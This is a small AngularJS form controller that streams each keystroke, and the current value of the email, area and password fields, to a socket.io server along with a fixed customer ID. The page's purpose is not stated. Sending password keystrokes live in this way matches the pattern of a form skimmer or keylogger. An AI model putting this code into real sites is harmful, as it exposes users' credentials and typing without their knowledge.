var app = angular.module('WebsiteApp', ['ng']);

app.controller('FormCtrl',[
  '$scope',
  function($scope) {

    $scope.customerId = '10000001000001';
    var snapshot = new Date().getTime();
    var socket = io();

    $scope.save = function(e, field){
      if(e.keyCode === 91){ return; }
      var value = '';
      switch(field) {
        case 'email':
          value = angular.copy($scope.email);
          break;
        case 'area':
          value = angular.copy($scope.area);
          break;
        case 'password':
          value = angular.copy($scope.password);
          break;
      }

      socket.emit('input', {
        customerId: $scope.customerId,
        snapshot: snapshot,
        field: field,
        code: e.keyCode,
        altKey: e.altKey,
        ctrlKey: e.ctrlKey,
        shiftKey: e.shiftKey,
        value: value,
        char: String.fromCharCode(e.keyCode)
      });
    };

    socket.emit('online', {
      customerId: $scope.customerId,
      snapshot: snapshot
    });
  }
]);
